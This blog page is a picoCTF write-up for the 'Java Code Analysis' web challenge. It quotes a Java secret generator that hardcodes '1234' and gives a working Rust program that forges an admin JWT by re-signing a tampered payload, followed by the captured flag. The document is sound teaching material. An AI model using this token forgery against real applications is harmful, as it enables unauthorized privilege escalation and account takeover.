<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Java Code Analysis!?! - lavafroth</title><meta name=description content='To get started we are given the username &ldquo;user&rdquo; and password &ldquo;user&rdquo; to log into the BookShelf Pico web application.
We are also given the source code of the application.
Taking a look at the src/main/java/io/github/nandandesai/pico/security subdirectory of the project, we see that it uses JWT.
Interestingly, the file SecretGenerator.java in the aforementioned directory contains a weak hardcoded &ldquo;random&rdquo; value 😱.
@Service
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn&#39;t exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}
This string &ldquo;1234&rdquo; is used as the secret for the JSON web token.'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/rss.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body><header><a class=site-name href=https://lavafroth.is-a.dev/><svg viewBox="0 0 8790 2080"><path d="M80 1935V465h216v1270h286v2e2zm853 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm1025 528L2014 465h210l108 868 8 142h12l8-142 108-868h210l-224 1470zm813 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm851 528V465h514v222h-298v386h2e2v222h-2e2v640zm910 0V465h216q194 0 286 108 92 107 92 316 0 124-43 215-44 90-106 132l147 699h-216l-122-620h-38v620zm216-820q60 0 95-26 35-27 50-76t15-116q0-105-34-161-35-57-126-57zm1084 836q-90 0-154-42-65-42-99-114-35-72-35-162V767q0-91 35-162 34-72 99-114 64-42 154-42t155 42q64 42 99 114 34 72 34 162v866q0 90-34 162-35 72-99 114-65 42-155 42zm0-210q40 0 56-33 16-34 16-75V767q0-41-17-74-17-34-55-34-37 0-54 34-18 33-18 74v866q0 41 17 75 17 33 55 33zm890 194V687h-204V465h624v222h-204v1248zm828 0V465h216v608h168V465h216v1470h-216v-640h-168v640z"/></svg></a><nav><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a><a href=../../index.xml aria-label=rss style=--url:url(./rss.svg)></a><nav></header><main><hgroup data-pagefind-body><p data-pagefind-ignore><time>Mar 18, 2023 | 3 minutes read</time></p><h1 data-pagefind-meta=title>Java Code Analysis!?!</h1></hgroup><section class=post-content data-pagefind-body><p>To get started we are given the username &ldquo;user&rdquo; and password &ldquo;user&rdquo; to log into the BookShelf Pico web application.
We are also given the source code of the application.</p><p>Taking a look at the <code>src/main/java/io/github/nandandesai/pico/security</code> subdirectory of the project, we see that it uses JWT.</p><p>Interestingly, the file <code>SecretGenerator.java</code> in the aforementioned directory contains a weak hardcoded <em>&ldquo;random&rdquo;</em> value 😱.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@Service</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SecretGenerator</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Logger logger <span style=color:#f92672>=</span> LoggerFactory.<span style=color:#a6e22e>getLogger</span>(SecretGenerator.<span style=color:#a6e22e>class</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String SERVER_SECRET_FILENAME <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;server_secret.txt&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Autowired</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> UserDataPaths userDataPaths;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String <span style=color:#a6e22e>generateRandomString</span>(<span style=color:#66d9ef>int</span> len) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// not so random</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;1234&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    String <span style=color:#a6e22e>getServerSecret</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            String secret <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String(FileOperation.<span style=color:#a6e22e>readFile</span>(userDataPaths.<span style=color:#a6e22e>getCurrentJarPath</span>(), SERVER_SECRET_FILENAME), Charset.<span style=color:#a6e22e>defaultCharset</span>());
</span></span><span style=display:flex><span>            logger.<span style=color:#a6e22e>info</span>(<span style=color:#e6db74>&#34;Server secret successfully read from the filesystem. Using the same for this runtime.&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> secret;
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>catch</span> (IOException e){
</span></span><span style=display:flex><span>            logger.<span style=color:#a6e22e>info</span>(SERVER_SECRET_FILENAME<span style=color:#f92672>+</span><span style=color:#e6db74>&#34; file doesn&#39;t exists or something went wrong in reading that file. Generating a new secret for the server.&#34;</span>);
</span></span><span style=display:flex><span>            String newSecret <span style=color:#f92672>=</span> generateRandomString(32);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                FileOperation.<span style=color:#a6e22e>writeFile</span>(userDataPaths.<span style=color:#a6e22e>getCurrentJarPath</span>(), SERVER_SECRET_FILENAME, newSecret.<span style=color:#a6e22e>getBytes</span>());
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (IOException ex) {
</span></span><span style=display:flex><span>                ex.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            logger.<span style=color:#a6e22e>info</span>(<span style=color:#e6db74>&#34;Newly generated secret is now written to the filesystem for persistence.&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> newSecret;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This string &ldquo;1234&rdquo; is used as the secret for the JSON web token.</p><p>After logging into the webapp, we notice the following key value pair in our local storage (press <code>Shift</code> <code>F9</code>).</p><table><thead><tr><th>Key</th><th>Value</th></tr></thead><tbody><tr><td><code>auth-token</code></td><td><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTY2OTgxOCwiaWF0IjoxNjc5MDY1MDE4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.7j5YSQOQMGw3NZ9ZVZG99UI0liH8vE7Jy4z2UWTMObk</code></td></tr><tr><td><code>token-payload</code></td><td><code>{"role":"Free","iss":"bookshelf","exp":1679669818,"iat":1679065018,"userId":1,"email":"user"}</code></td></tr></tbody></table><p>Let&rsquo;s write a quick program in Rust to tamper with the token.</p><p>Run the following to setup dependencies.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cargo new bookshelf
</span></span><span style=display:flex><span>cd bookshelf
</span></span><span style=display:flex><span>cargo add serde_json, frank_jwt, anyhow
</span></span></code></pre></div><p>Next, add the following to <code>src/main.rs</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-rust data-lang=rust><span style=display:flex><span><span style=color:#66d9ef>use</span> anyhow::Result;
</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> frank_jwt::{decode, encode, Algorithm, ValidationOptions};
</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> serde_json::value::Value;
</span></span><span style=display:flex><span><span style=color:#66d9ef>fn</span> <span style=color:#a6e22e>main</span>() -&gt; Result<span style=color:#f92672>&lt;</span>()<span style=color:#f92672>&gt;</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> signing_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1234&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> encoded_token <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY3OTY2OTgxOCwiaWF0IjoxNjc5MDY1MDE4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.7j5YSQOQMGw3NZ9ZVZG99UI0liH8vE7Jy4z2UWTMObk&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> algorithm <span style=color:#f92672>=</span> Algorithm::<span style=color:#66d9ef>HS256</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> validation <span style=color:#f92672>=</span> ValidationOptions::default();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> (header, <span style=color:#66d9ef>mut</span> payload) <span style=color:#f92672>=</span> decode(
</span></span><span style=display:flex><span>        encoded_token,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>signing_key,
</span></span><span style=display:flex><span>        algorithm,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>validation
</span></span><span style=display:flex><span>    )<span style=color:#f92672>?</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// tampering the payload
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    payload[<span style=color:#e6db74>&#34;role&#34;</span>] <span style=color:#f92672>=</span> Value::String(<span style=color:#e6db74>&#34;Admin&#34;</span>.into());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> token <span style=color:#f92672>=</span> encode(header, <span style=color:#f92672>&amp;</span>signing_key, <span style=color:#f92672>&amp;</span>payload, algorithm)<span style=color:#f92672>?</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>println!</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span>, payload);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>println!</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span>, token);
</span></span><span style=display:flex><span>    Ok(())
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Here, we have decoded the token, modified the <code>role</code> to <code>Admin</code> and re-encoded the token using the signing key.</p><p>To run the program, issue the command</p><pre tabindex=0><code>cargo run
</code></pre><p>Now in our browser, we set the <code>token-payload</code> and <code>auth-token</code> to each line of the output respectively.</p><p>If we reload the page, we see that although we have the admin role, we cannot read the flag book. At the admin dashboard at <code>/#/admindash</code>, we can see the requests to <code>/base/users</code> in the network tab (press <code>Ctrl</code> <code>Shift</code> <code>E</code>). From here we can see that admin has the associated <code>userId</code> of <code>2</code> and <code>email</code> of <code>admin</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;SUCCESS&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;payload&#34;</span>: [
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;id&#34;</span>: <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;email&#34;</span>: <span style=color:#e6db74>&#34;user&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;fullName&#34;</span>: <span style=color:#e6db74>&#34;User&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;lastLogin&#34;</span>: <span style=color:#e6db74>&#34;2023-03-17T14:56:58.339637063&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;role&#34;</span>: <span style=color:#e6db74>&#34;Free&#34;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;id&#34;</span>: <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;email&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;fullName&#34;</span>: <span style=color:#e6db74>&#34;Admin&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;lastLogin&#34;</span>: <span style=color:#e6db74>&#34;2023-03-17T14:51:39.063583433&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;role&#34;</span>: <span style=color:#e6db74>&#34;Admin&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>In our program, we will further modify the <code>userId</code> to <code>2</code> and email to <code>admin</code> under the tampering section.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-rust data-lang=rust><span style=display:flex><span>payload[<span style=color:#e6db74>&#34;email&#34;</span>] <span style=color:#f92672>=</span> Value::String(<span style=color:#e6db74>&#34;admin&#34;</span>.into());
</span></span><span style=display:flex><span>payload[<span style=color:#e6db74>&#34;userId&#34;</span>] <span style=color:#f92672>=</span> Value::Number(<span style=color:#ae81ff>2.</span>into());
</span></span></code></pre></div><p>Rerun the program with</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cargo run
</span></span></code></pre></div><p>and set the <code>token-payload</code> and <code>auth-token</code> in our browser to the new payload and encoded token from the program&rsquo;s output respectively.</p><p>Now we can go to the main page and click on the flag book. There, we get the following flag.</p><pre tabindex=0><code>picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}
</code></pre></section><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/java class=list-tag>Java</a>
<a href=https://lavafroth.is-a.dev/tags/jwt class=list-tag>JWT</a>
<a href=https://lavafroth.is-a.dev/tags/picoctf class=list-tag>PicoCTF</a>
<a href=https://lavafroth.is-a.dev/tags/web class=list-tag>Web</a></footer><nav data-post><a href=https://lavafroth.is-a.dev/post/picoctf-binary-exploitation-twosum/><span>←</span><span>Twosum</span></a>
<a href=https://lavafroth.is-a.dev/post/picoctf-web-java-script-kiddie-2/><span>Java Script Kiddie 2</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>